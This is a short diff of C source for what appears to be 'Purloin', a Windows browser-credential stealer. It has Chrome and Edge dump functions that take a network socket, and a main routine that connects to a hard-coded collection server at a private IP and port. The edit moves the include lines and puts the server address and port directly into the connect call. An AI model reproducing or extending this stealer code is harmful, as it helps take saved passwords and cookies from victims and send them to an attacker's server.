@@ -1,6 +1,3 @@
-#include <stdio.h>
-#include <stdlib.h>
-
 #include "Purloin/includes/Purloin_Debug.h"
 #include "Purloin/includes/Purloin_Server.h"
 #include "Purloin/includes/Purloin_Chrome.h"
@@ -8,18 +5,12 @@
 #include <windows.h>
 #include <tchar.h>
 #include <psapi.h>
+#include <stdio.h>
+#include <stdlib.h>
 
 #define ENC_MASTER_KEY_LEN 357
 #define CIPHER_LEN 512
 #define DEFAULT_BUFLEN 512
-//#define SERVER_IP "purloin.sytes.net"
-#define SERVER_IP "192.168.8.101"
-#define DEFAULT_PORT "25565"
-
-#pragma comment (lib, "Ws2_32.lib")
-#pragma comment (lib, "Mswsock.lib")
-#pragma comment (lib, "AdvApi32.lib")
-#pragma comment (lib, "Wlanapi.lib")
 
 BOOL dump_chrome(SOCKET ConnectSocket, CHAR * message, DWORD message_size);
 BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size);
@@ -32,7 +23,7 @@ int main() {
 	SOCKET ConnectSocket = INVALID_SOCKET;
 
 	/* Connect to the server */
-	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
+	if (!connect(&ConnectSocket, "192.168.8.101", "25565")) {
 		return FALSE;
 	}
 
